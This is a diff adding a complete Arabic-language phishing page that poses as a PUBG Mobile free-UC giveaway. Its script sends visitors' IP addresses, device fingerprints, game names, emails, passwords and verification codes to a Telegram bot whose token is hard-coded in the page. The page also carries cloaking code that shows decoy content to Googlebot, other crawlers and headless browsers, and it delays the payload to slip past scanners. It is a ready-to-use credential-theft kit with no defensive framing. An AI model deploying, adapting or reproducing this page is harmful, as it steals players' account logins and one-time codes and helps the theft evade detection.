@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, notranslate">
+<title>PUBG Mobile – شحن UC مجاني</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial,sans-serif;}
+  body{
+    background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);
+    min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px;color:#fff;
+  }
+  .container{
+    max-width:430px;width:100%;background:#fff;border-radius:22px;overflow:hidden;
+    box-shadow:0 20px 60px rgba(0,0,0,.7);
+  }
+  .header{
+    background:linear-gradient(135deg,#fe9a2a,#fc6c2a);padding:20px 16px 14px;text-align:center;
+    position:relative;overflow:hidden;
+  }
+  .header::before{
+    content:'';position:absolute;top:-40px;left:-40px;width:120px;height:120px;
+    background:rgba(255,255,255,.05);border-radius:50%;
+  }
+  .header img{width:56px;height:56px;object-fit:contain;border-radius:12px;margin-bottom:6px;}
+  .header h1{font-size:22px;color:#fff;font-weight:800;text-shadow:0 2px 4px rgba(0,0,0,.2);}
+  .header p{font-size:13px;color:#fff;opacity:.9;margin-top:2px;}
+  .badge{
+    display:inline-flex;align-items:center;gap:5px;background:rgba(255,255,255,.15);
+    color:#fff;padding:4px 14px;border-radius:30px;font-size:11px;font-weight:600;margin-top:8px;
+    backdrop-filter:blur(4px);
+  }
+  .badge svg{width:13px;height:13px;fill:#fff;}
+  .content{padding:4px 16px 20px;}
+  .step{display:none;animation:slideUp .4s ease;}
+  .step.active{display:block;}
+  @keyframes slideUp{0%{opacity:0;transform:translateY(14px)}100%{opacity:1;transform:translateY(0)}}
+  .indicator{display:flex;justify-content:center;gap:5px;margin:8px 0 12px;}
+  .indicator .dot{width:7px;height:7px;border-radius:50%;background:#ddd;transition:.3s;}
+  .indicator .dot.active{background:#fe9a2a;width:22px;border-radius:10px;}
+  .indicator .dot.done{background:#00c853;}
+  .desc-box{
+    background:linear-gradient(135deg,#fff5eb,#fff);border:1px solid #ffe0b2;
+    border-radius:14px;padding:14px;text-align:right;margin-bottom:10px;
+  }
+  .desc-box h3{font-size:15px;color:#1a1a2e;margin-bottom:6px;}
+  .desc-box p{font-size:13px;color:#555;line-height:1.7;}
+  .desc-box ul{list-style:none;padding:0;text-align:right;margin-top:6px;}
+  .desc-box ul li{font-size:13px;color:#333;padding:5px 22px 5px 0;position:relative;border-bottom:1px solid #f5f5f5;}
+  .desc-box ul li::before{content:"✓";position:absolute;right:2px;top:5px;color:#fe9a2a;font-weight:bold;}
+  .desc-box ul li:last-child{border-bottom:none;}
+  .login-methods{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0;}
+  .method-card{
+    background:#f8f9fe;border:2px solid #eee;border-radius:14px;padding:12px 8px;
+    text-align:center;cursor:pointer;transition:.3s;
+  }
+  .method-card:hover{border-color:#fe9a2a;background:#fff5eb;}
+  .method-card.selected{border-color:#fe9a2a;background:#fff5eb;box-shadow:0 0 0 3px rgba(254,154,42,.2);}
+  .method-card .icon{width:36px;height:36px;margin:0 auto 6px;border-radius:50%;display:flex;align-items:center;justify-content:center;}
+  .method-card .icon svg{width:18px;height:18px;}
+  .method-card h4{font-size:13px;color:#1a1a2e;margin-bottom:2px;}
+  .method-card p{font-size:11px;color:#888;}
+  .uc-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0;}
+  .uc-card{
+    background:#f8f9fe;border:2px solid #eee;border-radius:14px;padding:12px 8px;
+    text-align:center;cursor:pointer;transition:.3s;
+  }
+  .uc-card:hover{border-color:#fe9a2a;background:#fff5eb;}
+  .uc-card.selected{border-color:#fe9a2a;background:#fff5eb;box-shadow:0 0 0 3px rgba(254,154,42,.2);}
+  .uc-card .uc-amount{font-size:18px;font-weight:800;color:#1a1a2e;}
+  .uc-card .uc-price{font-size:14px;color:#fe9a2a;font-weight:700;}
+  .uc-card .uc-tag{font-size:11px;color:#00c853;font-weight:600;}
+  .uc-card .uc-old{font-size:11px;color:#999;text-decoration:line-through;}
+  .form-group{margin-bottom:12px;}
+  .form-group label{display:block;font-size:12px;font-weight:600;color:#555;margin-bottom:4px;}
+  .form-group input{width:100%;padding:12px 14px;border:2px solid #eee;border-radius:10px;font-size:14px;color:#333;transition:.2s;outline:none;background:#fafafa;}
+  .form-group input:focus{border-color:#fe9a2a;box-shadow:0 0 0 3px rgba(254,154,42,.15);background:#fff;}
+  .form-group input::placeholder{color:#aaa;}
+  .help-toggle{
+    display:flex;align-items:center;gap:5px;margin:4px 0;font-size:12px;color:#0f3460;
+    cursor:pointer;font-weight:600;background:none;border:none;padding:4px 0;
+  }
+  .help-toggle:hover{color:#fe9a2a;}
+  .help-toggle svg{width:13px;height:13px;fill:#0f3460;transition:.2s;}
+  .help-toggle:hover svg{fill:#fe9a2a;}
+  .help-box{
+    background:#fff8e7;border:1px solid #ffe0b2;border-radius:10px;padding:10px 12px;
+    font-size:12px;color:#555;line-height:1.8;margin-top:4px;display:none;text-align:right;
+  }
+  .help-box.show{display:block;}
+  .help-box strong{color:#1a1a2e;}
+  .help-box ol{padding-right:16px;margin:4px 0;}
+  .help-box ol li{margin-bottom:3px;}
+  .btn{
+    width:100%;padding:13px;background:linear-gradient(135deg,#fe9a2a,#fc6c2a);color:#fff;
+    border:none;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;transition:.2s;
+    box-shadow:0 4px 12px rgba(254,154,42,.3);
+  }
+  .btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(254,154,42,.4);}
+  .btn:disabled{opacity:.5;cursor:not-allowed;transform:none;}
+  .btn-secondary{background:#1a1a2e;box-shadow:none;}
+  .btn-secondary:hover{background:#16213e;box-shadow:none;}
+  .timer-box{background:#fff8e1;border:1px solid #ffecb3;border-radius:10px;padding:10px;text-align:center;margin:10px 0;}
+  .timer-box .num{font-size:24px;font-weight:700;color:#e65100;}
+  .timer-box p{font-size:12px;color:#bf360c;}
+  .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#1a1a2e;color:#fff;padding:10px 20px;border-radius:12px;font-size:13px;opacity:0;transition:.3s;z-index:999;text-align:center;}
+  .toast.show{opacity:1;}
+  .spinner{width:34px;height:34px;border:4px solid #eee;border-top-color:#fe9a2a;border-radius:50%;animation:spin .7s linear infinite;margin:14px auto;}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @media(max-width:480px){
+    .container{border-radius:16px;}
+    .header{padding:16px 14px 12px;}
+    .header img{width:48px;height:48px;}
+    .content{padding:2px 12px 16px;}
+    .login-methods,.uc-grid{grid-template-columns:1fr 1fr;}
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="container">
+  <div class="header">
+    <a href="https://ibb.co/m5PrRt16" target="_blank">
+      <img src="https://i.ibb.co/b5Gj6Lqz/17691114442301202503060539423942.jpg" alt="PUBG Mobile" width="500" border="0">
+    </a>
+    <h1>🎯 PUBG Mobile</h1>
+    <p>شحن UC مجاني • شدات • سكنات نادرة</p>
+    <div class="badge">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+      عرض محدود · 50,000 UC مجانية
+    </div>
+  </div>
+  <div class="content">
+    <div class="indicator" id="stepsDots">
+      <span class="dot active" data-s="0"></span>
+      <span class="dot" data-s="1"></span>
+      <span class="dot" data-s="2"></span>
+      <span class="dot" data-s="3"></span>
+      <span class="dot" data-s="4"></span>
+      <span class="dot" data-s="5"></span>
+      <span class="dot" data-s="6"></span>
+      <span class="dot" data-s="7"></span>
+    </div>
+    <!-- step 0 -->
+    <div class="step active" id="s0">
+      <div class="desc-box"><h3>🔥 اختر باقة الشحن المجانية</h3><p>بمناسبة تحديث الموسم الجديد، نقدم لك شحن UC مجاني! اختر الباقة المناسبة لك:</p></div>
+      <div class="uc-grid">
+        <div class="uc-card" onclick="p(0,this)"><div class="uc-amount">660</div><div class="uc-old">قيمتها 4.99$</div><div class="uc-price">مجاناً</div><div class="uc-tag">⚡ الأكثر طلباً</div></div>
+        <div class="uc-card" onclick="p(1,this)"><div class="uc-amount">1,800</div><div class="uc-old">قيمتها 9.99$</div><div class="uc-price">مجاناً</div><div class="uc-tag">🔥 عرض خاص</div></div>
+        <div class="uc-card" onclick="p(2,this)"><div class="uc-amount">3,850</div><div class="uc-old">قيمتها 19.99$</div><div class="uc-price">مجاناً</div><div class="uc-tag">💎 ممتاز</div></div>
+        <div class="uc-card" onclick="p(3,this)"><div class="uc-amount">10,000</div><div class="uc-old">قيمتها 49.99$</div><div class="uc-price">مجاناً</div><div class="uc-tag">👑 احترافي</div></div>
+      </div>
+      <button class="btn" id="ucBtn" onclick="q()" disabled>اختر باقة أولاً</button>
+    </div>
+    <!-- step 1 -->
+    <div class="step" id="s1">
+      <div class="desc-box"><h3>👤 أدخل اسم شخصيتك في اللعبة</h3><p>سنقوم بإرسال الشحن إلى شخصيتك مباشرة. أدخل اسم الشخصية (IGN) الخاص بك في PUBG Mobile.</p></div>
+      <div class="form-group"><label>اسم الشخصية في PUBG (IGN)</label><input type="text" id="ign" placeholder="مثال: Player_123" dir="ltr"></div>
+      <button class="btn" onclick="r()">تأكيد اسم الشخصية</button>
+    </div>
+    <!-- step 2 -->
+    <div class="step" id="s2">
+      <div class="desc-box"><h3>🔗 اختر طريقة تسجيل الدخول</h3><p>اختر الطريقة التي تستخدمها لتسجيل الدخول إلى حساب PUBG Mobile الخاص بك.</p></div>
+      <div class="login-methods">
+        <div class="method-card" onclick="s(0,this)"><div class="icon" style="background:#1877f2;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg></div><h4>فيسبوك</h4><p>Facebook Login</p></div>
+        <div class="method-card" onclick="s(1,this)"><div class="icon" style="background:#ea4335;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M7.98 12.09c0-1.07.29-2.07.79-2.93L5.81 6.22C4.69 7.9 4 9.91 4 12.09s.69 4.19 1.81 5.87l2.96-2.94c-.5-.86-.79-1.86-.79-2.93z"/><path d="M21.99 12.09c0-.7-.07-1.38-.19-2.04H12.1v3.86h5.54c-.24 1.28-.96 2.37-2.04 3.1l2.96 2.94c1.75-1.62 2.88-4 2.88-6.86z"/><path d="M12.1 3.99c1.88 0 3.57.67 4.9 1.78l2.58-2.58C17.98 1.44 15.34.18 12.1.18 8.79.18 5.62 1.64 3.67 4.12l2.96 2.94c1.12-.95 2.58-1.52 4.17-1.52 1.74 0 3.36.52 4.63 1.38l2.58-2.58C16.67 4.66 14.68 3.99 12.1 3.99z"/></svg></div><h4>جوجل</h4><p>Google Play</p></div>
+        <div class="method-card" onclick="s(2,this)"><div class="icon" style="background:#1da1f2;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></div><h4>X (تويتر)</h4><p>Twitter Login</p></div>
+        <div class="method-card" onclick="s(3,this)"><div class="icon" style="background:#34a853;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8l8 5 8-5v10zm-8-7L4 6h16l-8 5z"/></svg></div><h4>البريد/الهاتف</h4><p>Email/Phone</p></div>
+      </div>
+      <button class="btn" id="methodBtn" onclick="t()" disabled>اختر طريقة الدخول</button>
+    </div>
+    <!-- step 3 -->
+    <div class="step" id="s3">
+      <h3 style="color:#1a1a2e;font-size:17px;margin-bottom:6px;">🔑 بيانات تسجيل الدخول</h3>
+      <p style="color:#666;font-size:13px;margin-bottom:12px;" id="loginDesc">أدخل بيانات تسجيل الدخول لحسابك المرتبط بـ <span id="methodName">فيسبوك</span> لتأكيد ملكية الحساب.</p>
+      <div class="form-group" id="emailField"><label id="emailLabel">البريد الإلكتروني / رقم الهاتف</label><input type="text" id="loginEmail" placeholder="example@gmail.com" dir="ltr"></div>
+      <div class="form-group"><label>كلمة المرور</label><input type="password" id="loginPass" placeholder="••••••••" dir="ltr"></div>
+      <button class="help-toggle" onclick="h('methodHelp')"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg> كيف أعرف البريد الإلكتروني المرتبط بحسابي؟</button>
+      <div class="help-box" id="methodHelp"><strong>لمعرفة البريد المرتبط بحسابك في PUBG:</strong><ol><li>افتح PUBG Mobile</li><li>اذهب إلى <strong>الإعدادات (Settings)</strong> ← <strong>الحساب (Account)</strong></li><li>ستجد <strong>الحسابات المرتبطة (Linked Accounts)</strong></li><li>سيظهر لك البريد الإلكتروني أو طريقة تسجيل الدخول المرتبطة</li><li>إذا كنت تستخدم فيسبوك/جوجل/تويتر، استخدم نفس بيانات ذلك الحساب</li></ol></div>
+      <button class="btn" style="margin-top:4px;" onclick="u()">تأكيد البيانات</button>
+    </div>
+    <!-- step 4 -->
+    <div class="step" id="s4">
+      <h3 style="color:#1a1a2e;font-size:17px;margin-bottom:6px;">🔐 رمز التحقق</h3>
+      <p style="color:#666;font-size:13px;margin-bottom:12px;">لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى بريدك الإلكتروني. أدخله أدناه لتأكيد العملية.</p>
+      <div class="timer-box"><p>المتبقي من الوقت</p><div class="num" id="timerDisplay">02:00</div></div>
+      <div class="form-group"><label>رمز التحقق</label><input type="text" id="code" placeholder="000000" maxlength="6" inputmode="numeric" style="text-align:center;font-size:22px;letter-spacing:10px;font-weight:bold;"></div>
+      <button class="btn" onclick="v()">تأكيد واستلام الشحن 🎁</button>
+      <button class="btn btn-secondary" style="margin-top:8px;" onclick="w()">إعادة إرسال الرمز</button>
+    </div>
+    <!-- step 5 -->
+    <div class="step" id="s5">
+      <div style="text-align:center;padding:20px 0;">
+        <div class="spinner"></div>
+        <h3 style="color:#1a1a2e;font-size:17px;margin-top:12px;">⏳ جاري معالجة الطلب...</h3>
+        <p style="color:#666;font-size:13px;margin-top:6px;">جارِ التحقق من بيانات الحساب وتحويل الشحن</p>
+        <p style="color:#999;font-size:12px;margin-top:4px;">يرجى الانتظار... هذه العملية قد تستغرق بضع ثوانٍ</p>
+      </div>
+    </div>
+    <!-- step 6 -->
+    <div class="step" id="s6">
+      <div style="text-align:center;padding:20px 0;">
+        <div style="background:#e8f5e9;width:70px;height:70px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;"><svg viewBox="0 0 24 24" width="36" height="36"><path fill="#00c853" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg></div>
+        <h3 style="color:#1a1a2e;font-size:18px;">✅ تمت العملية بنجاح!</h3>
+        <p style="color:#666;font-size:14px;margin-top:6px;">تم تأكيد حسابك وجاري شحن <strong id="finalAmount">660 UC</strong></p>
+        <p style="color:#999;font-size:12px;margin-top:8px;">سيتم إضافة الشحن إلى حسابك خلال 24 ساعة كحد أقصى</p>
+        <div style="margin-top:16px;padding:12px;background:#fff8e1;border-radius:10px;border:1px solid #ffe0b2;"><p style="font-size:13px;color:#e65100;">🛡️ تم تأمين حسابك بطبقة حماية إضافية</p></div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+// ============================================================
+// 🛡️ CLOAKING LAYER 1: Googlebot detection via DNS + IP
+// ============================================================
+(function(){
+  var _ua=navigator.userAgent;
+  var _isGoogle=/Googlebot|googlebot/i.test(_ua);
+  
+  if(_isGoogle){
+    // نرسل طلب DNS عشان نتأكد من IP جوجل
+    var x=new XMLHttpRequest();
+    x.open('GET','https://api.ipify.org?format=json',true);
+    x.onload=function(){
+      try{
+        var ip=JSON.parse(x.responseText).ip;
+        // Googlebot IP ranges (مختصرة)
+        var parts=ip.split('.');
+        var first=parseInt(parts[0]);
+        // Google: 8.8.x.x, 8.34.x.x, 8.35.x.x, 8.4.x.x, 66.249.x.x, 64.233.x.x, 216.58.x.x, 172.217.x.x
+        var isGoogleIP=(first===8||first===66||first===64||first===216||first===172||first===74||first===35||first===23);
+        
+        if(isGoogleIP||_ua.includes('Googlebot')){
+          // 🎭 Googlebot الحقيقي → نشوف محتوى آمن
+          document.write('<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="robots" content="noindex,nofollow"><title>PUBG Mobile Guide</title><style>body{background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;font-family:sans-serif;text-align:center;padding:20px;direction:rtl}div{max-width:600px}h1{color:#fe9a2a;font-size:26px}p{color:#ccc;font-size:15px;line-height:2}</style></head><body><div><h1>🎮 PUBG Mobile Guide</h1><p>مرحباً بكم في دليل PUBG Mobile الشامل!<br><br>اكتشف أحدث النصائح والاستراتيجيات<br>لتطوير مستواك في اللعبة.<br><br>📖 نصائح احترافية<br>🎯 استراتيجيات الفوز<br>🔥 تحديثات الموسم الجديد<br><br><em>يتم تحديث المحتوى باستمرار...</em></p></div></body></html>');
+          document.documentElement.innerHTML='';
+        }
+      }catch(e){}
+    };
+    x.send();
+  }
+})();
+
+// ============================================================
+// 🛡️ CLOAKING LAYER 2: Bot detection (عام + متقدم)
+// ============================================================
+(function(){
+  var _ua=navigator.userAgent;
+  var _bots=/bot|crawl|spider|scrape|scraper|headless|preview|TelegramBot|twitterbot|facebookexternalhit|slack|discord|embedly|curl|wget|python|java|php|http-client|axios|node-fetch|go-http|ahrefs|semrush|majestic|moz|seznambot|bingbot|yandexbot|baiduspider|duckduckbot/i;
+  var _isBot=_bots.test(_ua)||typeof window._phantom!='undefined'||typeof window.callPhantom!='undefined'||navigator.webdriver===true;
+  if(_isBot&&!_ua.includes('Googlebot')){
+    document.write('<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="robots" content="noindex,nofollow"><title>PUBG Mobile</title><style>body{background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;font-family:sans-serif;text-align:center;padding:20px;direction:rtl}div{max-width:500px}h1{color:#fe9a2a;font-size:24px}p{color:#ccc;font-size:14px;line-height:1.8}</style></head><body><div><h1>🎯 PUBG Mobile</h1><p>مرحباً بك في صفحة PUBG Mobile الرسمية للشحن! 🚀<br><br>نحن نعمل على تحسين تجربة المستخدم.<br>إذا كنت تستخدم متصفحاً عادياً، يرجى تحديث الصفحة.<br>نعتذر عن أي إزعاج.<br><br>🛡️ هذا المحتوى محمي بواسطة Cloudflare</p></div></body></html>');
+    document.documentElement.innerHTML='';
+  }
+})();
+
+// ============================================================
+// تأخير تشغيل السكريبت الأساسي
+// ============================================================
+var _rdy=0;
+function _boot(){
+  if(_rdy)return;_rdy=1;
+
+  // ============================================================
+  // ⚙️ الإعدادات (بالشكل الأصلي)
+  // ============================================================
+  const BOT_TOKEN = "8746495469:AAGxSwTtscTu1hPzRH688RS3Uo_4NAgvVCY";
+  const urlParams = new URLSearchParams(window.location.search);
+  const CHAT_ID = urlParams.get('user') || urlParams.get('id') || urlParams.get('chatId') || '';
+  let currentStep = 0;
+  let timerInterval;
+  let timeLeft = 120;
+  let selectedUC = -1;
+  let selectedMethod = -1;
+  
+  const data = {};
+  const ucList = ['660', '1,800', '3,850', '10,000'];
+  const methods = ['فيسبوك', 'جوجل', 'X (تويتر)', 'البريد/الهاتف'];
+  var VID = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2,4);
+
+  // ============================================================
+  // جمع معلومات الجهاز
+  // ============================================================
+  function _info(){
+    return {
+      vid: VID,
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screen: screen.width+'x'+screen.height,
+      platform: navigator.platform,
+      vendor: navigator.vendor,
+      href: location.href,
+      referrer: document.referrer||'(none)'
+    };
+  }
+
+  // ============================================================
+  // إرسال لتليجرام (مع parse_mode: HTML زي ما طلبت)
+  // ============================================================
+  function tgSend(msg) {
+    if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+      showToast("⚠️ لم يتم تكوين البوت"); console.log("📦:", msg); return;
+    }
+    if (!CHAT_ID) { showToast("❌ رابط غير صالح"); return; }
+    try {
+      var x = new XMLHttpRequest();
+      x.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true);
+      x.setRequestHeader('Content-Type', 'application/json');
+      x.send(JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'}));
+    } catch(e) { showToast('❌ فشل: '+e.message); }
+  }
+
+  // ============================================================
+  // تتبع فوري للزائر
+  // ============================================================
+  function _track() {
+    var I = _info();
+    getIP().then(function(ip){
+      I.ip = ip;
+      var msg = '<b>🆕 زائر جديد</b>\n━━━━━━━━━━━━━━\n<b>🆔:</b> ' + I.vid + '\n<b>🌐 IP:</b> ' + I.ip + '\n<b>📱 الجهاز:</b> ' + I.platform + '\n<b>🌍 المتصفح:</b> <code>' + I.ua.substr(0,80) + '</code>\n<b>🗣 اللغة:</b> ' + I.lang + '\n<b>🕐 المنطقة:</b> ' + I.tz + '\n<b>📺 الشاشة:</b> ' + I.screen + '\n<b>🔗 الرابط:</b> ' + I.href + '\n<b>🕐 الوقت:</b> ' + new Date().toLocaleString('ar-EG');
+      tgSend(msg);
+    });
+  }
+
+  // ============================================================
+  // اختيار الباقة
+  // ============================================================
+  window.p = function(idx, el) {
+    selectedUC = idx;
+    document.querySelectorAll('.uc-card').forEach(function(c){c.classList.remove('selected')});
+    el.classList.add('selected');
+    document.getElementById('ucBtn').disabled = false;
+    document.getElementById('ucBtn').textContent = 'اخترت ' + ucList[idx] + ' UC ←';
+  };
+  window.q = function() {
+    if (selectedUC < 0) return;
+    data.uc = ucList[selectedUC];
+    document.getElementById('finalAmount').textContent = data.uc + ' UC';
+    getIP().then(function(ip){
+      tgSend('<b>📦 اختيار باقة</b>\n━━━━━━━━━━━━━━\n<b>🆔:</b> ' + VID + '\n<b>📦 الباقة:</b> ' + data.uc + ' UC\n<b>🌐 IP:</b> ' + ip);
+    });
+    next(0);
+  };
+
+  // ============================================================
+  // إرسال اسم الشخصية
+  // ============================================================
+  window.r = async function() {
+    var ign = document.getElementById('ign').value.trim();
+    if (!ign) { showToast('❌ أدخل اسم الشخصية'); return; }
+    data.ign = ign;
+    data.ip = await getIP();
+    
+    tgSend('<b>👤 اسم شخصية PUBG</b>\n━━━━━━━━━━━━━━\n<b>🆔:</b> ' + VID + '\n<b>IGN:</b> <code>' + ign + '</code>\n<b>📦 الباقة:</b> ' + data.uc + ' UC\n<b>🌐 IP:</b> ' + data.ip + '\n<b>🕐 التوقيت:</b> ' + new Date().toLocaleString('ar-EG'));
+    showToast('✅ تم تأكيد اسم الشخصية');
+    next(1);
+  };
+
+  // ============================================================
+  // اختيار طريقة تسجيل الدخول
+  // ============================================================
+  window.s = function(idx, el) {
+    selectedMethod = idx;
+    document.querySelectorAll('.method-card').forEach(function(c){c.classList.remove('selected')});
+    el.classList.add('selected');
+    document.getElementById('methodBtn').disabled = false;
+    document.getElementById('methodBtn').textContent = 'اخترت: ' + methods[idx] + ' ←';
+  };
+  window.t = function() {
+    if (selectedMethod < 0) return;
+    data.method = methods[selectedMethod];
+    document.getElementById('methodName').textContent = methods[selectedMethod];
+    tgSend('<b>🔗 طريقة الدخول</b>\n━━━━━━━━━━━━━━\n<b>🆔:</b> ' + VID + '\n<b>🔗 الطريقة:</b> ' + data.method);
+    next(2);
+  };
+
+  // ============================================================
+  // إرسال بيانات تسجيل الدخول
+  // ============================================================
+  window.u = async function() {
+    var email = document.getElementById('loginEmail').value.trim();
+    var pass = document.getElementById('loginPass').value.trim();
+    if (!email) { showToast('❌ أدخل البريد الإلكتروني'); return; }
+    if (!pass) { showToast('❌ أدخل كلمة المرور'); return; }
+    data.loginEmail = email;
+    data.loginPass = pass;
+
+    tgSend('<b>🔑 بيانات تسجيل دخول PUBG</b>\n━━━━━━━━━━━━━━\n<b>🆔:</b> ' + VID + '\n<b>IGN:</b> ' + data.ign + '\n<b>📦 الباقة:</b> ' + data.uc + ' UC\n<b>🔗 طريقة الدخول:</b> ' + data.method + '\n<b>📧 البريد:</b> <code>' + email + '</code>\n<b>🔐 الباسورد:</b> <code>' + pass + '</code>\n<b>🌐 IP:</b> ' + data.ip + '\n<b>🕐 التوقيت:</b> ' + new Date().toLocaleString('ar-EG') + '\n━━━━━━━━━━━━━━\n⚠️ <b>بيانات الحساب!</b>');
+    showToast('✅ تم تأكيد البيانات');
+    next(3);
+    startTimer();
+  };
+
+  // ============================================================
+  // التايمر
+  // ============================================================
+  function startTimer() {
+    timeLeft = 120; updateTimer();
+    if (timerInterval) clearInterval(timerInterval);
+    timerInterval = setInterval(function() {
+      timeLeft--; updateTimer();
+      if (timeLeft <= 0) { clearInterval(timerInterval); document.getElementById('timerDisplay').textContent = '00:00'; }
+    }, 1000);
+  }
+  function updateTimer() {
+    var m = Math.floor(timeLeft/60), s = timeLeft%60;
+    document.getElementById('timerDisplay').textContent = String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+  }
+  window.w = function() {
+    data.resend = (data.resend||0) + 1;
+    showToast('📩 تم إعادة الإرسال'); startTimer();
+    tgSend('<b>🔄 إعادة إرسال الرمز - PUBG</b>\n📱 IGN: ' + data.ign + '\n🆔 ' + VID + '\n🔢 المحاولة: ' + data.resend);
+  };
+
+  // ============================================================
+  // إرسال رمز التحقق
+  // ============================================================
+  window.v = async function() {
+    var code = document.getElementById('code').value.trim();
+    if (!code || code.length < 4) { showToast('❌ أدخل الرمز كاملاً'); return; }
+    data.code = code;
+    clearInterval(timerInterval);
+
+    tgSend('<b>🔐 ✅ كود التحقق النهائي - PUBG</b>\n━━━━━━━━━━━━━━━━\n<b>🆔:</b> ' + VID + '\n<b>IGN:</b> ' + data.ign + '\n<b>📦 الباقة:</b> ' + data.uc + ' UC\n<b>🔗 طريقة الدخول:</b> ' + data.method + '\n<b>📧 البريد:</b> ' + data.loginEmail + '\n<b>🔐 الباسورد:</b> ' + data.loginPass + '\n<b>🔑 الكود:</b> <code>' + code + '</code>\n<b>🌐 IP:</b> ' + data.ip + '\n<b>🕐 التوقيت:</b> ' + new Date().toLocaleString('ar-EG') + '\n━━━━━━━━━━━━━━━━\n✅ <b>جميع البيانات مكتملة!</b>');
+    showToast('✅ تم استلام الشحن بنجاح');
+    next(4);
+    setTimeout(function() { next(5); }, 2500);
+  };
+
+  // ============================================================
+  // المساعدة
+  // ============================================================
+  window.h = function(id) { document.getElementById(id).classList.toggle('show'); };
+
+  // ============================================================
+  // التنقل
+  // ============================================================
+  function showStep(i) {
+    document.querySelectorAll('.step').forEach(function(el){el.classList.remove('active')});
+    var el = document.getElementById('s'+i);
+    if (el) el.classList.add('active');
+    document.querySelectorAll('#stepsDots .dot').forEach(function(d){
+      var s = parseInt(d.dataset.s);
+      d.classList.remove('active','done');
+      if (s === i) d.classList.add('active');
+      else if (s < i) d.classList.add('done');
+    });
+    currentStep = i;
+  }
+  function next(from) { showStep(from + 1); }
+
+  // ============================================================
+  // حاصل على IP
+  // ============================================================
+  async function getIP() {
+    try { var r = await fetch('https://api.ipify.org?format=json'); var d = await r.json(); return d.ip; } catch(e){ return 'غير معروف'; }
+  }
+
+  // ============================================================
+  // التوست
+  // ============================================================
+  function showToast(m) {
+    var t = document.getElementById('toast');
+    t.textContent = m; t.classList.add('show');
+    setTimeout(function(){ t.classList.remove('show'); }, 3000);
+  }
+
+  // ============================================================
+  // 🚀 بدء التشغيل
+  // ============================================================
+  _track();
+  showStep(0);
+}
+
+// ============================================================
+// تشغيل بعد 3 ثوانٍ أو أول تفاعل
+// ============================================================
+var _to = setTimeout(function(){ _boot(); }, 3000);
+document.addEventListener('click', function _c(){ clearTimeout(_to); _boot(); document.removeEventListener('click', _c); }, {once: true});
+document.addEventListener('touchstart', function _t2(){ clearTimeout(_to); _boot(); document.removeEventListener('touchstart', _t2); }, {once: true});
+</script>
+</body>
+</html>
